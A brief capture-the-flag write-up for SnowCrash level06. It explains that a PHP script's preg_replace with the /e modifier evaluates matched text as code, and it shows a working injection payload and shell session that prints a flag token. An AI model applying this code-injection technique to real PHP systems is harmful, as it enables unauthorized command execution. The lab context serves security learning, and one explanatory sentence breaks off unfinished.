# Level06

We have a php binary which take a filename as argument and print its content with some modification made based on regex.
But, `/e` is used which allow code execution because it captures the match and evaluate it as php.
So we just have to follow the expected pattern and we can execute code.
The pattern is `[x text]` and in text we will 

```shell
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/level06
level06@SnowCrash:~$ ./level06 /tmp/level06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```